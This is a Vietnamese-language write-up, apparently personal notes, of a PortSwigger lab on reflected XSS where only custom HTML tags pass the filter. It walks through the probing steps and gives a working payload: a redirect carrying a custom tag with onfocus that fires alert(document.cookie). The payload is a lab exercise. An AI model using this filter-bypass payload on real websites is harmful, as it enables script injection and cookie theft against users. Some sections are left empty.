# Lab: {Name}
- Category: Reflected XSS into HTML context with all tags blocked except custom ones
- Độ khó: Practitioner
- Link lab: https://portswigger.net/web-security/cross-site-scripting/contexts/lab-html-context-with-all-standard-tags-blocked

## Summary

Lab này block mọi HTML tags ngoại trừ custom. Để solve thì cần 1 payload xss mà inject custom tag và tự động alert `document.cookies`.

## Recon

Dự đoán xss được reflected và fire sau khi search.

![](../0_images/XSS/lab-onclick-event-angle-brackets-double-quotes-html-encoded-single-quotes-backslash-escaped/Screenshot%20from%202026-11-20%2010-29-00.png)

Thử `<script>alert(1)</script>` và bị chặn bởi WAF?

![](../0_images/XSS/lab-onclick-event-angle-brackets-double-quotes-html-encoded-single-quotes-backslash-escaped/Screenshot%20from%202026-11-20%2010-31-02.png)

Cho phép custom tag (nhìn vào tên bài) thì thử payload `<xss>hehe</xss>` và đc allow

![](../0_images/XSS/lab-onclick-event-angle-brackets-double-quotes-html-encoded-single-quotes-backslash-escaped/Screenshot%20from%202026-11-20%2010-32-01.png)

Thử thêm `onfocus` vào để tự động render.
Kết quả là nó escape ra được

![](../0_images/XSS/lab-onclick-event-angle-brackets-double-quotes-html-encoded-single-quotes-backslash-escaped/Screenshot%20from%202026-11-20%2010-35-07.png)

## Root cause

## Reproduce

Payload hoàn chỉnh
```
<script>
location = 'https://0a26009d04f9877f80a22635005c0010.web-security-academy.net/?search=%3Cxss+id%3Dx+onfocus%3Dalert%28document.cookie%29%20tabindex=1%3Ea';
</script>
```

Bấm store -> Deliver to victim

![](../0_images/XSS/lab-onclick-event-angle-brackets-double-quotes-html-encoded-single-quotes-backslash-escaped/Screenshot%20from%202026-11-20%2010-41-54.png)
![](../0_images/XSS/lab-onclick-event-angle-brackets-double-quotes-html-encoded-single-quotes-backslash-escaped/Screenshot%20from%202026-11-20%2010-41-58.png)

## Impact

